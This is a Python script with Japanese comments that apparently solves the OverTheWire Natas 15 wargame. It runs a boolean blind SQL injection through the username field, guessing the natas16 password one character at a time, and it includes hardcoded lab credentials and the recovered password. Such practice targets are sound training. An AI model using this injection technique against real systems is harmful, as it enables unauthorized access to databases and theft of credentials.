import requests

# 接続先URL
url = "http://natas15.natas.labs.overthewire.org/"

# Basic認証が必要な場合の指定方法（ユーザー名, パスワード）
auth = ("natas15", "GB6USCJYJjwLyYhZUNkE1NwDueiTow6g")

# 候補文字列
cand = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
cand = sorted(cand)
# print(cand)

cnt = 0
decided = ""
epoch = 0

while True:
    if cnt == len(cand):
        print("password: " + decided)
        break
    password = decided + cand[cnt] + "%"
    epoch += 1
    print("epoch: " + str(epoch) + ", password: " + password)
    username = f'natas16" and password like binary "{password}'
    data = {"username": username}
    # リクエストの実行
    response = requests.post(url, data=data, auth=auth)

    if "This user exists." in response.text:
        # passwordを表示して、終了。
        decided += cand[cnt]
        cnt = 0
        print("password: " + decided)
    else:
        cnt += 1

# password: xm6xeern3zsgjrdqbpmuqavv65k7e3gb
# password: Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb
